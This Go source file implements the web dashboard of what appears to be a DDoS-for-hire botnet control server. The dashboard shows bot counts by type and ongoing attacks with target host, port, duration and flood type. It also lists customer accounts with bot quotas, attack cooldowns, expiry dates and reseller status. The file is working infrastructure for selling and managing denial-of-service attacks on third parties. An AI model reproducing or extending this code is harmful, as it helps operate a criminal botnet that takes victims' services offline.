package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"sync"
	"time"
)

type Server struct {
	clientList *ClientList
	prevDist   map[string]int
	prevCount  int
	mu         sync.Mutex
}

type Data struct {
	BotType string
	Count   int
	Change  int
}

func NewServer(cl *ClientList) *Server {
	return &Server{
		clientList: cl,
		prevDist:   make(map[string]int),
	}
}

func (s *Server) HandleRoot(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	defer s.mu.Unlock()

	users, err := database.GetUsers()
	if err != nil {
		http.Error(w, "Failed to fetch users: "+err.Error(), http.StatusInternalServerError)
		return
	}

	var data []Data
	m := s.clientList.Distribution()

	for k, v := range m {
		change := v - s.prevDist[k]
		data = append(data, Data{
			BotType: k,
			Count:   v,
			Change:  change,
		})
	}
	s.prevDist = m

	attacks, err := database.getOngoingAttacks()
	if err != nil {
		http.Error(w, "Failed to fetch ongoing attacks: "+err.Error(), http.StatusInternalServerError)
		return
	}

	type Attack struct {
		Username  string
		Host      string
		Port      string
		Duration  string
		FloodType string
		Time      string
	}

	var ongoingAttacks []Attack

	for _, attack := range attacks {
		ongoingAttacks = append(ongoingAttacks, Attack{
			Username:  attack["username"],
			Host:      attack["host"],
			Port:      attack["port"],
			Duration:  attack["duration"],
			FloodType: attack["floodType"],
			Time:      attack["time"],
		})
	}

	type User struct {
		ID            int
		Username      string
		DurationLimit int
		Cooldown      int
		MaxBots       int
		Admin         bool
		MaxAttacks    int
		TotalAttacks  int
		Expiry        string
		Reseller      bool
		CreatedBy     string
	}

	var userList []User

	for _, user := range users {
		expiryText := "∞"
		if user.Expiry.Valid {
			expiryTime := time.Unix(user.Expiry.Int64, 0)
			if time.Now().After(expiryTime) {
				expiryText = "Expired"
			} else {
				expiryDays := expiryTime.Sub(time.Now()).Hours() / 24
				if expiryDays <= 999999 {
					expiryText = fmt.Sprintf("%.2f days", expiryDays)
				}
			}
		}

		userList = append(userList, User{
			ID:            user.ID,
			Username:      user.Username,
			DurationLimit: user.DurationLimit,
			Cooldown:      user.Cooldown,
			MaxBots:       user.MaxBots,
			Admin:         user.Admin,
			MaxAttacks:    user.MaxAttacks,
			TotalAttacks:  user.TotalAttacks,
			Expiry:        expiryText,
			Reseller:      user.Reseller,
			CreatedBy:     user.CreatedBy,
		})
	}

	tmpl, err := template.ParseFiles("./html/template.html")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	dataMap := map[string]interface{}{
		"TableData": userList,
		"ChartData": data,
		"Attacks":   ongoingAttacks,
	}

	err = tmpl.Execute(w, dataMap)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}

func (s *Server) HandleBotStatisticsAPI(w http.ResponseWriter, r *http.Request) {
	s.mu.Lock()
	defer s.mu.Unlock()

	var data []Data
	m := s.clientList.Distribution()

	for k, v := range m {
		change := v - s.prevDist[k]
		data = append(data, Data{
			BotType: k,
			Count:   v,
			Change:  change,
		})
	}
	s.prevDist = m

	w.Header().Set("Content-Type", "application/json")
	err := json.NewEncoder(w).Encode(data)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
	}
}
